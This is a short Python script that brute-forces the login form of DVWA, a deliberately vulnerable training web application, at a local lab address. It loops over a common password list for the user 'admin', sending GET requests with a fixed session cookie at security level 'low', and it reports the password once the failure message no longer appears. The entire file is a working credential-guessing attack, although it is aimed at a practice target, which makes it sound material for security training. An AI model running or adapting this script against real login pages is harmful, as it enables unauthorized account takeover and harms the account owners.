import requests


path = "http://dvwa.local/vulnerabilities/brute/"


def main():
    with open("./10-million-password-list-top-10000.txt", "r") as f:
        username = "admin"
        for l in f.readlines():
            query = f"?username={username}&password={l[:-1]}&Login=Login#"
            cookies = {"PHPSESSID": "u4a9m9mrif72mft1ohecvtumfel", "security": "low"}
            r = requests.get(path + query, cookies=cookies)
            print(f"Testing {l[:-1]}")
            if "<pre><br />Username and/or password incorrect.</pre>" not in r.text:
                return f"\"{l}\" is the key to rule the world of DVWA"
    


if __name__ == '__main__':
    print(main())